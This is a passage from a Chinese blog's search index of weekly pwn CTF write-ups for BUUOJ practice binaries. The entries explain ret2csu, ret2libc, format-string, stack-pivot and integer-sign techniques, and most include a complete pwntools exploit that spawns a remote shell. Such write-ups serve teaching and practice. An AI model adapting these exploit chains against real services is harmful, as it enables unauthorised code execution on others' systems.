<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn-第八周</title>
    <link href="/2023/03/11/pwn-%E7%AC%AC%E5%85%AB%E5%91%A8/"/>
    <url>/2023/03/11/pwn-%E7%AC%AC%E5%85%AB%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>考察ret2csu</p><p>64位程序，传递参数要使用寄存器。当我们找不到每一个寄存器的地址，利用_libc_csu_init这个一般一定存在的函数中的gadgets</p><p>利用libc_csu_init中的两段代码片段来实现3个参数的传递（间接性的传递参数）</p><p>例如</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040075</span>A   <span class="hljs-keyword">pop</span>  rbx  <span class="hljs-meta">#需置为0，为配合第二段代码的call指令寻址</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040075</span>B   <span class="hljs-keyword">pop</span>  rbp  <span class="hljs-meta">#需置为1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040075</span>C   <span class="hljs-keyword">pop</span>  <span class="hljs-built_in">r12</span>  <span class="hljs-meta">#需置为要调用的函数地址，注意是got地址而不是plt地址，因为plt表中存的是指令，也就无法进行call</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040075</span>E   <span class="hljs-keyword">pop</span>  <span class="hljs-built_in">r13</span>  <span class="hljs-meta">#write函数的第一个参数</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400760</span>   <span class="hljs-keyword">pop</span>  <span class="hljs-built_in">r14</span>  <span class="hljs-meta">#write函数的第二个参数</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400762</span>   <span class="hljs-keyword">pop</span>  <span class="hljs-built_in">r15</span>  <span class="hljs-meta">#write函数的第三个参数</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400764</span>   retn<br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400740</span>   <span class="hljs-keyword">mov</span>  <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400743</span>   <span class="hljs-keyword">mov</span>  <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400746</span>   <span class="hljs-keyword">mov</span>  <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">r15d</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400749</span>   <span class="hljs-keyword">call</span>  <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rbx</span>*<span class="hljs-number">8</span>]#想要调用<span class="hljs-built_in">r12</span>的地址就需要将<span class="hljs-built_in">rbx</span>置为<span class="hljs-number">0</span>，即<span class="hljs-number">0</span>*<span class="hljs-number">8</span> 才不会产生偏移量<br>                        <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-number">1</span> #此时，<span class="hljs-built_in">rbx</span>会加<span class="hljs-number">1</span>，然后和<span class="hljs-built_in">rbp</span>对比<br>                        <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rbx</span> #payload中只需要将<span class="hljs-built_in">rbp</span>置为<span class="hljs-number">1</span>，比较结果为非零值，便不会发生跳转，使程序继续执行到<span class="hljs-keyword">ret</span>的位置<br>                        <span class="hljs-keyword">jnz</span>     short loc_5555555546F0<br></code></pre></td></tr></table></figure><p>检查</p><p><img src="https://img1.imgtp.com/2023/03/12/9t7eYkO9.jpg"></p><p>execve的系统调用号59，也就是0x3b，应是通过execve(“&#x2F;bin&#x2F;sh”,0,0)，而 &#x2F;bin&#x2F;sh 需要我们写入</p><p><img src="https://img1.imgtp.com/2023/03/12/i9daSUtO.jpg"></p><p>libc_csu_init中的代码片段</p><p><img src="https://img1.imgtp.com/2023/03/12/8bPnwbh1.jpg"></p><p>计算栈内的偏移，来找到写入的&#x2F;bin&#x2F;sh的地址</p><p><img src="https://img1.imgtp.com/2023/03/12/iN6jqHeH.jpg"></p><p><img src="https://img1.imgtp.com/2023/03/12/qQ1YX2oK.jpg"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,27538)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn3&#x27;</span>)<br><span class="hljs-attribute">vuln</span>=elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br><span class="hljs-attribute">mov_rax</span>=0x00000000004004E2<br><span class="hljs-attribute">mov_rdx_r13</span>=0x0000000000400580<br><span class="hljs-attribute">rbx_rbp_r12_r13_r14_r15_ret</span>=0x000000000040059a<br><span class="hljs-attribute">sys_call</span>=0x0000000000400517<br><span class="hljs-attribute">rdi_ret</span>=0x00000000004005a3<br><span class="hljs-attribute">p</span>=b&quot;/bin/sh\x00&quot;*2+p64(vuln)#写入 /bin/sh<br>io.sendline(p)<br>io.recv(0x20)<br><span class="hljs-attribute">stack_addr</span>=u64(io.recvuntil(b&#x27;\x7f&#x27;[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))#通过write把栈的基地址打印出来<br><span class="hljs-attribute">bs</span>=stack_addr-0x118#计算写入的 /bin/sh 的地址<br><span class="hljs-attribute">p</span>=b&quot;/bin/sh\x00&quot;+p64(rdi_ret)+p64(rbx_rbp_r12_r13_r14_r15_ret)<br>p+=p64(0)+p64(1)+p64(bs+0x8)+p64(0x0)+p64(0)+p64(0)<br>p+=p64(mov_rdx_r13)+p64(mov_rax)+p64(rdi_ret)+p64(bs)+p64(sys_call)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查</p><p><img src="https://img1.imgtp.com/2023/03/12/m6dT6Mrt.jpg"></p><p>还是libc</p><p>不过不同的是printf的第一个参数要为格式化字符串%s</p><p><img src="https://img1.imgtp.com/2023/03/12/9EnhZlZB.jpg"></p><p><img src="https://img1.imgtp.com/2023/03/12/Lki3xw5s.jpg"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,27267)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./rop2&#x27;)<br><span class="hljs-attribute">printf_plt</span>=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-attribute">read_got</span>=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-attribute">main_addr</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">ss_addr</span>=0x400770<br><span class="hljs-attribute">rdi</span>=0x400733<br><span class="hljs-attribute">rsi</span>=0x400731<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x20+8)+p64(rdi)+p64(ss_addr)+p64(rsi)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_addr)<br>io.recvuntil(<span class="hljs-string">&#x27;name? &#x27;</span>)<br>io.sendline(p)<br><span class="hljs-attribute">read_addr</span>=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(read_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;read&#x27;,read_addr)<br><span class="hljs-attribute">base</span>=read_addr-libc.dump(&#x27;read&#x27;)<br><span class="hljs-attribute">sys</span>=base+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bs</span>=base+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x20+8)+p64(rdi)+p64(bs)+p64(sys)<br>io.recvuntil(<span class="hljs-string">&#x27;name? &#x27;</span>)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/03/12/r8vWoSmz.jpg"></p><p><img src="https://img1.imgtp.com/2023/03/12/vKwYvV9f.jpg"></p><h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p><img src="https://img1.imgtp.com/2023/03/12/qExAm7WR.jpg"></p><p>利用write的libc</p><p><img src="https://img1.imgtp.com/2023/03/12/5hFCo2gt.jpg"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,26796)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./level3&#x27;)<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main_addr</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x88+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)<br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(p)<br><span class="hljs-attribute">write_addr</span>=u32(io.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">base</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">sys</span>=base+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bs</span>=base+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x88+4)+p32(sys)+p32(1)+p32(bs)<br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/03/12/tnjwVDHh.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn-第七周</title>
    <link href="/2023/03/01/pwn-%E7%AC%AC%E4%B8%83%E5%91%A8/"/>
    <url>/2023/03/01/pwn-%E7%AC%AC%E4%B8%83%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>格式化字符串漏洞</p><p><img src="https://img1.imgtp.com/2023/02/26/KgVwtZMk.jpg"></p><p>存在printf(buf)，可以进行利用</p><p><img src="https://img1.imgtp.com/2023/02/26/h8BFzfkU.jpg"></p><p>计算偏移量为11</p><p><img src="https://img1.imgtp.com/2023/02/26/0veExr5A.jpg"></p><p>exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-built_in">io</span>=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25689</span>)<br>x=<span class="hljs-number">0x804A02C</span><br>p=p32(x)+b<span class="hljs-string">&#x27;%11$n&#x27;</span><br><span class="hljs-built_in">io</span>.sendline(p)<br><span class="hljs-built_in">io</span>.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/26/KZnWXXI8.jpg"></p><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>本题主要是栈迁移</p><p>要求缓冲区变量在溢出时，至少能覆盖栈上 <strong>ebp</strong> 与 <strong>ret</strong> 两个位置</p><p>例如，当上层函数调用foo函数，即 <strong>eip</strong> 执行到<strong>call foo</strong>指令时，<strong>call</strong> 指令以及foo函数开头的指令依次做如下事情来「保护现场」：</p><p>牢记foo结束后应从哪里继续执行（保存当前 <strong>eip</strong>下面的位置到栈中，即 <strong>ret</strong>）；</p><p>牢记上层函数的栈底位置（保存当前 <strong>ebp</strong> 的内容到栈中，即为old ebp）；</p><p>牢记foo函数栈开始的位置（保存当前栈顶的内容到 <strong>ebp</strong>，便于foo函数栈内的寻址）</p><p>leave 与 <strong>ret</strong> 指令则相当于完成如下事情来「恢复现场」：</p><p>清空当前函数栈以还原栈空间（直接移动栈顶指针 <strong>esp</strong> 到当前函数的栈底 <strong>ebp</strong> ）；</p><p>还原栈底（将此时 <strong>esp</strong> 所指的上层函数栈底 old ebp 弹入 <strong>ebp</strong> 寄存器内）；</p><p>还原执行流（将此时 <strong>esp</strong> 所指的上层函数调用foo时的地址弹入 <strong>eip</strong> 寄存器内）；</p><p>篡改栈上原<strong>old</strong> <strong>ebp</strong> 内容，则能篡改 <strong>ebp</strong> 寄存器中的内容，从而去篡改 <strong>esp</strong> 的内容，进而影响到 <strong>eip</strong>；</p><p>将栈上 <strong>ret</strong> 部分覆盖为另一组 <strong>leave</strong> <strong>ret</strong>指令（gadget）的地址，即最终程序退出时会执行两次 <strong>leave</strong> 指令，一次 <strong>ret</strong> 指令。由此，当 <strong>pop ebp</strong> 被第一次执行后，<strong>eip</strong> 将指向又一条 <strong>mov esp, ebp</strong>指令的地址，而此时 <strong>ebp</strong> 寄存器的内容已变为了第一次 <strong>pop ebp</strong> 时，被篡改过的栈上 <strong>ebp</strong> 的数据。这样，<strong>esp</strong> 就会被「骗」到了另外的一处内存空间，从而整个函数的栈空间也完成了「迁移」。</p><p><img src="https://img1.imgtp.com/2023/03/05/SlZYIcxm.jpg"></p><p>可以溢出的长度不足</p><p><img src="https://img1.imgtp.com/2023/03/05/PXOy8GZu.jpg">]()</p><p>找到 leave 的地址</p><p><img src="https://img1.imgtp.com/2023/03/05/17vcrXX1.jpg"></p><p>算出偏移量</p><p><img src="https://img1.imgtp.com/2023/03/05/5QQH3FYi.jpg"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29039)<br><span class="hljs-attribute">leave_ret</span>=0x080484b8<br><span class="hljs-attribute">sys_addr</span>=0x08048400<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x27)+b&#x27;b&#x27;<br>io.send(p)<br>io.recvuntil(b<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-attribute">ebp</span>=u32(io.recv(4))<br><span class="hljs-built_in">print</span>(hex(ebp))<br><span class="hljs-attribute">p</span>=b&#x27;aaaa&#x27;+p32(sys_addr)+b&#x27;aaaa&#x27;+p32(ebp-0x38+0x10)+b&#x27;/bin/sh\x00&#x27;<br><span class="hljs-attribute">p</span>=p.ljust(0x28,b&#x27;a&#x27;)+p32(ebp-0x38)+p32(leave_ret)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/03/05/frVxqPza.jpg"></p><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p><img src="https://img1.imgtp.com/2023/03/05/FeU26A9a.jpg"></p><p>对于长度限制，由于有符号向无符号的转换，使用-1便可以绕过，然后就是普通的泄露libc</p><p><img src="https://img1.imgtp.com/2023/03/05/KWsiIQdR.jpg"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,25427)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pwn2s16&#x27;)<br><span class="hljs-attribute">printf_plt</span>=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-attribute">printf_got</span>=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><span class="hljs-attribute">main_addr</span>=0x80485b8<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x2c+4)+p32(printf_plt)+p32(main_addr)+p32(printf_got)<br>io.recvuntil(b<span class="hljs-string">&#x27;read? &#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-1&#x27;</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;data!\n&#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(b<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-attribute">printf_addr</span>=u32(io.recv(4))<br><span class="hljs-built_in">print</span>(hex(printf_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;printf&#x27;,printf_addr)<br><span class="hljs-attribute">libc_base</span>=printf_addr-libc.dump(&#x27;printf&#x27;)<br><span class="hljs-attribute">sys</span>=libc_base+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">sh</span>=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x2c+4)+p32(sys)+p32(main_addr)+p32(sh)<br>io.recvuntil(b<span class="hljs-string">&#x27;read? &#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/03/05/ct4HxVVe.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>周题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn_第六周</title>
    <link href="/2023/02/24/pwn-%E7%AC%AC%E5%85%AD%E5%91%A8/"/>
    <url>/2023/02/24/pwn-%E7%AC%AC%E5%85%AD%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>检查</p><p><img src="https://img1.imgtp.com/2023/02/25/eUU6UAh8.jpg"></p><p>找到溢出点，还是泄露libc的地址</p><p><img src="https://img1.imgtp.com/2023/02/25/138y6bd6.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/25/VCnT6ZD2.jpg"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29810)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./2018rop&#x27;)<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">main_addr</span>=0x80484C6<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x88+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(p)<br><span class="hljs-attribute">write_addr</span>=u32(io.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">base_addr</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">sys</span>=base_addr+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bs</span>=base_addr+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x88+4)+p32(sys)+b&#x27;aaaa&#x27;+p32(bs)<br>io.sendline(p)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/25/NsmHPpOY.jpg"></p><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查文件</p><p><img src="https://img1.imgtp.com/2023/02/25/yPAeHq4B.jpg"></p><p>发现溢出点</p><p><img src="https://img1.imgtp.com/2023/02/25/SoUgftxV.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/25/14JaAQdv.jpg"></p><p>exp</p><p>开始一直出现一些报错，一直调不好，最后发现是因为main的地址写错了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import*<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,25393)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./20babyrop&#x27;)<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">ret</span>=0x4004c9<br><span class="hljs-attribute">rdi</span>=0x400733<br><span class="hljs-attribute">main_add</span>=0x4006AD<br><span class="hljs-attribute">p</span>=b&quot;a&quot;*(0x28)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_add)<br>io.recvuntil(<span class="hljs-string">&#x27;story!&#x27;</span>)<br>io.sendline(p)<br><span class="hljs-attribute">puts_add</span>=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(puts_add))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;puts&quot;,puts_add)<br><span class="hljs-attribute">base_add</span>=puts_add-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">sys</span>=base_add+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bs</span>=base_add+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">p</span>=b&quot;a&quot;*(0x28)+p64(ret)+p64(rdi)+p64(bs)+p64(sys)<br>io.recvuntil(<span class="hljs-string">&#x27;story!&#x27;</span>)<br>io.sendline(p)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/25/s3vZP9PT.jpg"></p><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p><img src="https://img1.imgtp.com/2023/02/25/wmQkQ6VC.jpg"></p><p>找到溢出点</p><p><img src="https://img1.imgtp.com/2023/02/25/iLQO39Hh.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/25/959H7ybk.jpg"></p><p>只要满足条件就可以直接溢出，简单的有符号数与无符号数，使用-1便满足条件</p><p><img src="https://img1.imgtp.com/2023/02/25/anVygE7j.jpg"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=remote(&quot;node4.buuoj.cn&quot;,29004)<br><span class="hljs-attribute">p</span>=b&#x27;-1&#x27;<br>io.sendline(p)<br><span class="hljs-attribute">ret</span>=0x400599<br><span class="hljs-attribute">rdi</span>=400893<br><span class="hljs-attribute">sys_addr</span>=0x40072A<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*(0x10+8)+p64(ret)+p64(sys_addr)<br>io.sendline(p)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/02/25/XxXImrLu.jpg"></p><h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>检查，开启了栈不可执行与栈保护</p><p><img src="https://img1.imgtp.com/2023/02/26/KgVwtZMk.jpg"></p><p>发现只要x等于4就可以执行system(“&#x2F;bin&#x2F;sh”)，有格式化字符串漏洞</p><p><img src="https://img1.imgtp.com/2023/02/26/h8BFzfkU.jpg"></p><p><img src="https://img1.imgtp.com/2023/02/26/0veExr5A.jpg"></p><p>exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 